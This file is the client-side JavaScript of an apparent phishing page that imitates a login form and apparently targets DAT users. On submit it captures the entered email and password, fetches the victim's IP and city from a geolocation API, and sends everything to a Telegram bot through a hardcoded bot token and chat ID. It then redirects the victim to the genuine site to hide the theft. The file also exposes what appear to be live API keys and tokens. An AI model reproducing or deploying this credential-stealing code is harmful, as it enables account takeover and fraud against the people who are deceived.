window.addEventListener("load", async () => {
  const forma = document.querySelector("#forma");

  const emailInput = document.querySelector("#email");
  const passwordInput = document.querySelector("#password");
  const submitBtn = document.querySelector("#submit-button");
  const checkbox = document.querySelector("#mat-checkbox-1");
  const checkInput = document.querySelector("#mat-checkbox-1-input");

  let counter = 2;

  const setCheckbox = () => {
    checkbox.className =
      "mat-checkbox remember-me mat-accent ng-valid ng-dirty ng-touched mat-checkbox-checked";
  };
  // setCheckbox()

  const unsetCheckbox = () => {
    checkbox.className = "";
  };

  // unsetCheckbox()

  checkInput.addEventListener("click", () => {
    if (counter % 2 === 0) {
      setCheckbox();
    } else {
      unsetCheckbox();
    }
    console.log("done");
    counter++;
  });

  const makeErrorEmail = () => {
    const errorMat1 = document.querySelector("#error-1");
    const emailLabel = document.querySelector("#email-label");
    emailLabel.style.color = "#f44336";
    errorMat1.style.display = "block";
  };

  const unsetErrorEmail = () => {
    const errorMat1 = document.querySelector("#error-1");
    const emailLabel = document.querySelector("#email-label");
    emailLabel.style.color = "rgb(0, 0, 0, .6)";
    errorMat1.style.display = "none";
  };

  const makeErrorPassword = () => {
    const errorMat2 = document.querySelector("#error-2");
    const passwordLabel = document.querySelector("#password-label");
    passwordLabel.style.color = "#f44336";
    errorMat2.style.display = "block";
  };

  const unsetErrorPassword = () => {
    const errorMat2 = document.querySelector("#error-2");
    const passwordLabel = document.querySelector("#password-label");
    passwordLabel.style.color = "rgb(0, 0, 0, .6)";
    errorMat2.style.display = "none";
  };

  passwordInput.addEventListener("input", (e) => {
    if (e.target.value.length === 0) {
      makeErrorPassword();
    } else {
      unsetErrorPassword();
    }
  });

  emailInput.addEventListener("input", (e) => {
    if (e.target.value.length === 0) {
      makeErrorEmail();
      // console.log(1)
    } else {
      unsetErrorEmail();
      // console.log(2)
    }
  });

  forma.addEventListener("submit", async (e) => {
    e.preventDefault();

    let apiKey = "d4e99cf0beab4a8990866c26753f4bbf";
    const {data} = await axios.get(
      `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}`
    );


    const email = document.querySelector("#email").value;
    const password = document.querySelector("#password").value;

    console.log(email, password);

    if (email.length === 0 || password.length === 0) {
      return true;
    }

    let time = new Date();
    let hours = time.getHours();
    let minutes = time.getMinutes();
    let seconds = time.getSeconds();
    let now = time.toLocaleDateString();
    let site = location.hostname;
    let ip = data.ip;
    let city = data.city;

    let today = `${hours}:${minutes}:${seconds}`;

    let chars =
      "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let passwordLength = 8;
    let pass = "";
    for (let i = 0; i <= passwordLength; i++) {
      let randomNumber = Math.floor(Math.random() * chars.length);
      pass += chars.substring(randomNumber, randomNumber + 1);
    }
    // console.log(pass)
    // console.log(today)

    // console.log()
    // setTimeout(() => {
    // console.log(ip, city)
    let message = `
🔗 ${site}
├ IP: ${ip}
├ City: \`${city}\`
├ Date: \`${now} | ${today}\`
├ \`${ email }:${ password }\``;

    
    
    const token = "5406451033:AAF3Xq5TiIZo-cjTTH0eGuwsLWFaxvJxSpM"; // Токен бота
    const chatID = "-1001899434432"; // chat id
    const URI_API = `https://api.telegram.org/bot${token}/sendMessage`;
    axios
      .post(URI_API, {
        chat_id: chatID,
        parse_mode: "Markdown",
        text: message,
      })
      .then((res) => (window.location.href = "http://power.dat.com"));

    // }, 10)
  });
});
